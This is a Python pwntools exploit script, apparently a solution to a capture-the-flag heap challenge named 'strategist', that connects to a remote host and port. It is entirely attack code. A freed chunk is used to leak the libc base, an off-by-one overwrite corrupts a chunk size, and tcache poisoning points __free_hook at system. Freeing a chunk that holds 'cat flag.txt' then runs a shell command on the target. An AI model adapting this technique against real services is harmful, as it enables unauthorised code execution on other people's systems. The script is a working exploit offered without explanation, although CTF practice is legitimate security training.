from pwn import *

#p = process("./strategist")
p = remote("94.237.61.252",43488)
libc = ELF("./glibc/libc.so.6")

context.log_level="debug"
context.arch="amd64" 

def add(size,content):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("> ",str(size))
    p.sendafter("> ",content)


def add_null(size):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("> ",str(size))
    p.sendlineafter("> ","")


def show(index):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("> ",str(index))

def edit(index,content):
    p.sendlineafter("> ",str(3))
    p.sendlineafter("> ",str(index))
    p.sendafter("> ",content)

def delete(index):
    p.sendlineafter("> ",str(4))
    p.sendlineafter("> ",str(index))

add(10,'aaaabbbb') #0
add(1056,'aaaabbbb') #1
add(1056,'aaaabbbb')#2
delete(1)
add_null(1056) #0

#leak libc
show(1)
p.recv(0x2e)
arena = u64(p.recv(6).ljust(8,b'\x00'))
success("arena : " + hex(arena))
arena_offset = 0x3ebc0a
libc.address = arena - 0x3ebc0a
success("libc base address : " + hex(libc.address))

system = libc.symbols['system']
malloc_hook = libc.symbols["__malloc_hook"]
free_hook = libc.symbols["__free_hook"]
success("system address : " + hex(system))
success("malloc hook address : " + hex(malloc_hook))
success("free hook address : " + hex(free_hook))


add(32,'zzzzzzzz') #3
add(40,'aaaaaaaabbbbbbbbccccccccddddddddeeeeeeee') #4
add(32,'zzzzzzzz') #5
add(32,'zzzzzzzz') #6
add(32,'zzzzzzzz') #7
add(32,'zzzzzzzz') #8
add(32,'zzzzzzzz') #9

delete(8)
delete(7)
delete(6)
delete(5)


payload = b'aaaaaaaabbbbbbbbccccccccddddddddeeeeeeee' +b'\x51'
success(payload)
edit(4,payload)



add(32,b'gggggggg') #5
delete(5)

fake_chunk = b'a' *40 + p64(0x31) + p64(free_hook)
add(64,fake_chunk)

add(32,b'a') #6
add(32,p64(system)) #7
add(32,b'cat flag.txt')
delete(8)
#gdb.attach(p)

p.interactive()